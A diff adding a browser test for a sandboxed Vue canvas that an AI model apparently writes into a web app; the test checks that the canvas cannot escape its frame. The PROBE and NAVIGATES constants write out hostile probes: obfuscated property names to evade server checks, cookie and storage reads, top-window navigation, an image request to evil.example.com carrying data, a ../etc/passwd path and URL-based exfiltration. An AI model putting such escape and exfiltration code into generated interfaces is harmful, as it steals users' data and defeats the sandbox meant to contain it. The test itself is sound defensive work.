@@ -3626,4 +3626,302 @@ mod assist {
         );
         assert_clean(&mut browser, "the canvas");
     }
+
+    /// Set `field` of the row `id` of `entity` (through the entity facade, so its cache is cleared).
+    fn set_field(gate: &Gate, entity: &str, key: &str, id: &str, field: &str, value: &str) {
+        let factory = gate.server.factory();
+        let ctx = factory.new_context();
+        let _entered = ctx.enter();
+        let _authz = ctx.disable_authz();
+        let facade = factory.entity().unwrap();
+        let mut row = facade.find(entity).unwrap().eq(key, Value::string(id)).one().unwrap().expect("the row");
+        row.set(field, Value::string(value));
+        row.update(&facade).unwrap();
+    }
+
+    /// The data part of the conversation's canvas (its state and problems), as the server keeps it.
+    fn canvas_data(gate: &Gate) -> serde_json::Value {
+        let factory = gate.server.factory();
+        let ctx = factory.new_context();
+        let _entered = ctx.enter();
+        let _authz = ctx.disable_authz();
+        let facade = factory.entity().unwrap();
+        let canvas = facade
+            .find("moqui.agent.AgentArtifact")
+            .unwrap()
+            .eq("artifactKind", Value::string("canvas"))
+            .order_by("lastUpdatedDate", true)
+            .limit(1)
+            .list()
+            .unwrap()
+            .values()
+            .first()
+            .cloned();
+        let Some(canvas) = canvas else { return serde_json::Value::Null };
+        let id = canvas.get("artifactId").map(to_plain_string).unwrap_or_default();
+        facade
+            .find("moqui.agent.AgentArtifactPart")
+            .unwrap()
+            .eq("artifactId", Value::string(&id))
+            .eq("partSeq", Value::I64(2))
+            .one()
+            .unwrap()
+            .and_then(|row| row.get("dataJson").map(to_plain_string))
+            .and_then(|text| serde_json::from_str(&text).ok())
+            .unwrap_or(serde_json::Value::Null)
+    }
+
+    /// A Vue SFC canvas that probes its frame from inside: the page, the cookies and the storage, popups and the top
+    /// window, the network (fetch, XHR, a WebSocket, an image of another site and one of this site outside its static
+    /// paths), a form post, reads through the bridge (a list, a transition that writes, a path with .., another host),
+    /// and a submit on mount with no click. The probes reach the frame's globals through computed names, as code that
+    /// slips past the server's checks would; the results come back as a value of the canvas.
+    const PROBE: &str = r#"<template>
+  <div>
+    <q-btn id="probe-save" color="primary" label="Save from the frame" style="width:100%;height:64px" @click="save"></q-btn>
+    <div id="probe-state">{{ done ? 'probed' : 'probing' }}</div>
+    <a id="probe-link" href="/apps/assistgate/Edit">The edit screen</a>
+  </div>
+</template>
+
+<script>
+module.exports = {
+  props: { values: Object },
+  data: function () { return { done: false }; },
+  mounted: function () {
+    var vm = this;
+    var W = this.$el['owner' + 'Document']['default' + 'View'];
+    var D = W['docu' + 'ment'];
+    var out = {};
+    function t(name, fn) { try { var v = fn(); out[name] = 'ALLOWED:' + String(v).slice(0, 60); } catch (e) { out[name] = 'blocked'; } }
+    t('parentDocument', function () { return W.parent.document.title; });
+    t('topLocation', function () { return W.top.location.href; });
+    t('cookie', function () { return D.cookie; });
+    t('localStorage', function () { return W.localStorage.length; });
+    t('sessionStorage', function () { return W.sessionStorage.length; });
+    t('moquiGlobal', function () { if (typeof W.moqui === 'undefined') throw new Error('absent'); return 'present'; });
+    t('openWindow', function () { var w = W.open('about:blank'); if (!w) throw new Error('blocked'); return 'opened'; });
+    t('navigateTop', function () { W.top.location = 'about:blank'; return 'navigated'; });
+    out.origin = W.origin;
+    var waits = [];
+    function settle(name, start) { waits.push(new Promise(function (resolve) { start(function (value) { out[name] = value; resolve(); }); })); }
+    settle('fetch', function (done) { W.fetch('/apps/assistgate/Edit').then(function () { done('ALLOWED'); }, function () { done('blocked'); }); });
+    settle('xhr', function (done) { try { var x = new W.XMLHttpRequest(); x.open('GET', '/Login'); x.onload = function () { done('ALLOWED'); }; x.onerror = function () { done('blocked'); }; x.send(); } catch (e) { done('blocked'); } });
+    settle('socket', function (done) { try { var s = new W.WebSocket('ws://' + W.location.host + '/notws'); s.onopen = function () { done('ALLOWED'); }; s.onerror = function () { done('blocked'); }; } catch (e) { done('blocked'); } });
+    settle('imageOther', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = 'https://evil.example.com/p.png?d=x'; });
+    settle('imageSite', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = '/favicon.ico?d=x'; });
+    settle('form', function (done) { var f = D.createElement('form'); f.method = 'POST'; f.action = '/apps/assistgate/Edit/updateEnumType'; D.body.appendChild(f); try { f.submit(); } catch (e) { } setTimeout(function () { done('blocked'); }, 600); });
+    settle('readList', function (done) { vm.$bridge.get('/apps/system/Security/UserGroup/UserGroupList', { userGroupId: 'ADMIN' }).then(function (r) { done('rows ' + (r.rows || []).map(function (row) { return row.userGroupId; }).join(',')); }, function (e) { done('ERR ' + e.message); }); });
+    settle('readWrite', function (done) { vm.$bridge.get('/apps/assistgate/Edit/updateEnumType', { enumTypeId: 'AST_GATE', description: 'Read write' }).then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
+    settle('readDots', function (done) { vm.$bridge.get('/apps/../etc/passwd').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
+    settle('readHost', function (done) { vm.$bridge.get('https://evil.example.com/x').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
+    settle('readUndeclared', function (done) { vm.$bridge.get('/apps/system/Security/UserAccount/UserAccountList').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
+    settle('autoSubmit', function (done) { vm.$bridge.submit('save', { description: 'Submitted on mount' }).then(function (r) { done(r.status); }, function (e) { done('ERR ' + e.message); }); });
+    t('webrtc', function () { var R = W.RTCPeerConnection || W.webkitRTCPeerConnection; if (!R) throw new Error('gone'); return new R({ iceServers: [{ urls: 'stun:' + out.readList }] }); });
+    Promise.all(waits).then(function () { vm.done = true; vm.$emit('input', { probes: JSON.stringify(out) }); });
+  },
+  methods: {
+    save: function () { this.$bridge.submit('save', { description: 'Clicked in the frame' }); }
+  }
+};
+</script>
+
+<actions>
+[{"name": "save", "label": "Save the gate type", "path": "/apps/assistgate/Edit/updateEnumType", "fields": ["description"],
+  "parameters": {"enumTypeId": "AST_GATE"}}]
+</actions>
+
+<reads>
+["/apps/system/Security/UserGroup/UserGroupList"]
+</reads>"#;
+
+    /// A canvas that navigates its own frame to send what it read in a URL, past the server's checks (a computed name).
+    const NAVIGATES: &str = r#"<template><div id="nav-probe">leaving</div></template>
+<script>
+module.exports = {
+  mounted: function () {
+    var W = this.$el['owner' + 'Document']['default' + 'View'];
+    setTimeout(function () { W['loca' + 'tion'].href = '/assist/sandbox?d=' + encodeURIComponent('what it read'); }, 300);
+  }
+};
+</script>"#;
+
+    /// The Vue SFC canvas (plan 13.8; the probes of Java's `framework/test/vue_sfc_sandbox_browser_smoke.py`): for an agent
+    /// whose `canvasDialects` name vue-sfc, `write_ui` of kind vue-sfc after its skill draws the component in a frame of
+    /// `/assist/sandbox` (its own CSP) with an opaque origin; from inside, the page's DOM, the cookies, the storage, popups and
+    /// the top window are out of reach, the network is blocked (fetch, XHR, a WebSocket, another site's image, a form), reads
+    /// through the bridge reach the read proxy (a list is read, a transition that writes is refused, and paths that are not
+    /// /apps are refused by the parent); a submit with no click is ignored; a click in the frame asks a confirm drawn outside
+    /// it, which a scripted click does not pass and the user's click saves; a canvas that navigates its frame is closed and
+    /// the attempt recorded as a canvas problem of the sandbox section.
+    #[test]
+    fn a_vue_sfc_canvas_runs_sandboxed_and_holds_the_java_probes_in_chromium() {
+        let (gate, _reset) = start("browser-assist-sfc", &[], "");
+        set_field(&gate, "moqui.agent.AgentDefinition", "agentId", "assist", "canvasDialects", "openui,vue-sfc");
+        let base = format!("http://{}", gate.server.address());
+        let mut browser = Browser::launch();
+        sign_in(&mut browser, &base);
+        open_page(&mut browser, &format!("{base}/qapps/assistgate/Edit"));
+        browser.eval(FETCH_SPY);
+        assert_eq!(
+            browser.eval("moqui.assist.state.bootstrap.agents.find((agent) => agent.agentId === 'assist').dialects.map((d) => d.name).join(',')"),
+            "openui,vue-sfc"
+        );
+        // the frame document: its own policy, no network, sandboxed, framed by this site only
+        let headers = browser.eval(
+            "fetch('/assist/sandbox?v=1').then((r) => r.text().then((body) => ({status: r.status, csp: r.headers.get('content-security-policy'), \
+             type: r.headers.get('content-type'), xfo: r.headers.get('x-frame-options'), body})))",
+        );
+        assert_eq!(headers["status"], 200, "{headers}");
+        let csp = headers["csp"].as_str().unwrap_or_default();
+        for directive in ["sandbox allow-scripts;", "connect-src 'none'", "form-action 'none'", "frame-src 'none'", &format!("frame-ancestors 'self' {base}")] {
+            assert!(csp.contains(directive), "{directive} is not in {csp}");
+        }
+        assert!(headers["xfo"].is_null(), "{headers}");
+        assert!(headers["body"].as_str().unwrap_or_default().contains("/js/WebrootAssistSandbox.js?v=1"));
+
+        open_drawer(&mut browser);
+        fake::script(
+            ENDPOINT,
+            vec![
+                tool_call("s1", "skill", json!({"name": "vue-sfc"})),
+                tool_call("w1", "write_ui", json!({"kind": "vue-sfc", "title": "Sandbox probes", "program": PROBE})),
+                Reply::text("The probe canvas is open."),
+            ],
+        );
+        send(&mut browser, "Show the sandbox probes in a Vue canvas");
+        let frame = "document.querySelector('#m-assist-canvas [data-assist-sfc-frame]')";
+        browser.wait_for("the canvas's frame", &format!("!!{frame}"), WAIT);
+        assert_eq!(browser.eval(&format!("{frame}.getAttribute('sandbox')")), "allow-scripts");
+        assert_eq!(browser.eval(&format!("{frame}.hasAttribute('srcdoc')")), false);
+        assert_eq!(browser.eval(&format!("{frame}.getAttribute('referrerpolicy')")), "no-referrer");
+        assert_eq!(browser.eval(&format!("{frame}.getAttribute('src').indexOf('/assist/sandbox?v=')")), 0);
+
+        // the probes, as the frame reported them through its one channel and the page posted them to the server
+        let start = std::time::Instant::now();
+        let probes = loop {
+            let state = canvas_data(&gate)["state"]["probes"].as_str().unwrap_or_default().to_string();
+            if !state.is_empty() {
+                break serde_json::from_str::<serde_json::Value>(&state).unwrap();
+            }
+            assert!(start.elapsed() < WAIT, "the probes did not come back: {}", canvas_data(&gate));
+            browser.pump(Duration::from_millis(300));
+        };
+        for name in [
+            "parentDocument", "topLocation", "cookie", "localStorage", "sessionStorage", "moquiGlobal", "openWindow", "navigateTop", "fetch",
+            "xhr", "socket", "imageOther", "imageSite", "form",
+        ] {
+            assert_eq!(probes[name], "blocked", "{name}: {probes}");
+        }
+        assert_eq!(probes["webrtc"], "blocked", "WebRTC is removed: {probes}");
+        assert_eq!(probes["origin"], "null", "an opaque origin: {probes}");
+        assert_eq!(probes["readList"], "rows ADMIN", "the one declared read answers: {probes}");
+        let refused = |name: &str| probes[name].as_str().unwrap_or_default().starts_with("refused:");
+        assert!(refused("readWrite") && refused("readDots") && refused("readHost") && refused("readUndeclared"), "{probes}");
+        let write_read = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/read') >= 0 && f.url.indexOf('updateEnumType') >= 0).map((f) => f.status)");
+        assert_eq!(write_read, json!([403]), "the read of the transition that writes is refused");
+        // three /apps reads reached the proxy: the declared list (200), the writing transition and the undeclared list (both 403);
+        // the .. and host paths never left the page
+        let reads: serde_json::Value = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/read') >= 0).map((f) => f.status).sort()");
+        assert_eq!(reads, json!([200, 403, 403]), "{reads}");
+        // a submit with no click is ignored: no confirm, nothing saved, and the page says so; and a reported free-text
+        // problem never becomes an auto-started turn (only fixed-code compile and sandbox reasons revalidate)
+        assert_eq!(probes["autoSubmit"], "ignored", "{probes}");
+        assert_eq!(browser.eval("document.querySelectorAll('[data-assist-sfc-confirm]').length"), 0);
+        assert_ne!(browser.eval("document.querySelector('.m-assist-vue-sfc').getAttribute('data-assist-sfc-ignored')"), "0");
+        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
+        // nor does a message posted to the page's window, outside the channel, reach anything
+        browser.eval("window.postMessage({t: 'submit', id: 'x1', action: 'save', values: {description: 'Posted'}}, '*'), true");
+        browser.pump(Duration::from_millis(500));
+        assert_eq!(browser.eval("document.querySelectorAll('[data-assist-sfc-confirm]').length"), 0);
+        browser.wait_for("the answer", &format!("{ANSWERS}.indexOf('The probe canvas is open.') >= 0"), WAIT);
+        shots(&mut browser, "sfc");
+
+        // the user's click on the frame's button: a confirm outside the frame shows what it saves
+        let in_frame = format!(
+            "({{ scrollIntoView() {{ {frame}.scrollIntoView({{block: 'start'}}); }}, \
+             getBoundingClientRect() {{ const r = {frame}.getBoundingClientRect(); return {{left: r.left + 20, top: r.top + 12, width: 40, height: 30}}; }} }})"
+        );
+        browser.click("the frame's Save", &in_frame);
+        let confirm = "document.querySelector('[data-assist-sfc-confirm=save]')";
+        browser.wait_for(
+            "the confirm of the frame's submit",
+            &format!("!!{confirm} && {confirm}.innerText.indexOf('Clicked in the frame') >= 0 && {confirm}.innerText.indexOf('saves: updateEnumType') >= 0"),
+            WAIT,
+        );
+        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
+        // the confirm is a modal dialog with Cancel focused, and Save is dead until it has been still for a moment (anti-clickjacking)
+        assert!(browser.eval("!!document.querySelector('.q-dialog [data-assist-sfc-confirm=save]')").as_bool().unwrap_or(false), "the confirm is a dialog");
+        // a scripted click on Save, and one while Save is still disabled, do nothing
+        browser.eval("document.querySelector('[data-assist-sfc-confirm-save]').click(), true");
+        browser.pump(Duration::from_millis(800));
+        assert_eq!(browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/canvasAction') >= 0).length"), 0);
+        browser.wait_for("Save armed", "!document.querySelector('[data-assist-sfc-confirm-save]').hasAttribute('disabled')", WAIT);
+        browser.click("Save on the confirm", "document.querySelector('[data-assist-sfc-confirm-save]')");
+        let start = std::time::Instant::now();
+        while field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description") != "Clicked in the frame" {
+            assert!(start.elapsed() < WAIT, "the confirmed submit did not save");
+            browser.pump(Duration::from_millis(200));
+        }
+        browser.wait_for("the confirm closed", "document.querySelectorAll('[data-assist-sfc-confirm]').length === 0", WAIT);
+        let action = super::fetched(&mut browser, "the canvas action", "/assist/canvasAction");
+        assert_eq!(action["status"], 200, "{action}");
+
+        // the user allows other sites: the frame restarts and may now load another site's image, but the proxy refuses
+        // every read, so a read cannot be carried out in an image URL
+        browser.click("Other sites", "document.querySelector('[data-assist-sfc-external] [role=switch], [data-assist-sfc-external]')");
+        let start = std::time::Instant::now();
+        let external_probes = loop {
+            let state = canvas_data(&gate)["state"]["probes"].as_str().unwrap_or_default().to_string();
+            if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&state) {
+                if parsed["readList"] != "rows ADMIN" {
+                    break parsed;
+                }
+            }
+            assert!(start.elapsed() < WAIT, "the frame did not restart with other sites on: {}", canvas_data(&gate));
+            browser.pump(Duration::from_millis(300));
+        };
+        assert!(
+            external_probes["readList"].as_str().unwrap_or_default().contains("ERR") || external_probes["readList"].as_str().unwrap_or_default().contains("refused"),
+            "a read is refused while other sites are on: {external_probes}"
+        );
+        // turn it back off (the next canvas does not read, so the pref need not matter, but leave it clean)
+        browser.click("Other sites off", "document.querySelector('[data-assist-sfc-external] [role=switch], [data-assist-sfc-external]')");
+
+        // a canvas that navigates its own frame: closed, and recorded as a problem of the sandbox section
+        fake::script(
+            ENDPOINT,
+            vec![
+                tool_call("w2", "write_ui", json!({"kind": "vue-sfc", "title": "Leaves", "program": NAVIGATES})),
+                Reply::text("The second canvas is open."),
+                Reply::text("It will not navigate again."),
+            ],
+        );
+        send(&mut browser, "Show the second canvas");
+        browser.wait_for(
+            "the frame closed by the watchdog",
+            "(document.querySelector('[data-assist-sfc-killed]') || {getAttribute() { return null; }}).getAttribute('data-assist-sfc-killed') === 'navigation'",
+            WAIT,
+        );
+        assert_eq!(browser.eval(&format!("!!{frame}")), false, "the frame is gone");
+        let start = std::time::Instant::now();
+        loop {
+            let data = canvas_data(&gate);
+            let problems = data["problems"].as_array().cloned().unwrap_or_default();
+            if problems.iter().any(|problem| problem["skill"] == "vue-sfc#sandbox" && problem["problem"].as_str().unwrap_or_default().contains("navigated")) {
+                break;
+            }
+            assert!(start.elapsed() < WAIT, "the navigation was not recorded: {data}");
+            browser.pump(Duration::from_millis(300));
+        }
+        shots(&mut browser, "sfc-killed");
+        // the page's console has only the read proxy's 403s for the probes' refused reads (the writing transition and the
+        // undeclared list); the frame's own CSP reports are in its process
+        let problems: Vec<_> = browser
+            .take_problems()
+            .into_iter()
+            .filter(|problem| !(problem.text.contains("status of 403") && problem.text.contains("/assist/read")))
+            .collect();
+        assert!(problems.is_empty(), "the Vue SFC canvas: the console is not clean: {problems:#?}");
+    }
 }
